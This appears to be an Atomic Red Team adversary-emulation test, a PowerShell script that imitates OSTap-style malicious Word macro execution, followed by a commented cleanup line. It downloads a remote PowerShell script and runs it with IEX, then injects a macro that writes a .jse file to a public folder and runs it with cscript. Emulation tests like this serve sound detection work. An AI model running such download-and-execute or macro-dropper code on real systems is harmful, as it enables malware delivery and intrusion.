#Atomic Test #1 - OSTap Style Macro Execution 

try {
    New-Object -COMObject "Word.Application" | Out-Null
    $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
    Stop-Process -Name $process

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
    $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
    Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

    exit 0
  } catch { 
    Write-Host "You will need to install Microsoft Word manually to meet this requirement"
    exit 1 }



#Cleanup Commands:
#Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore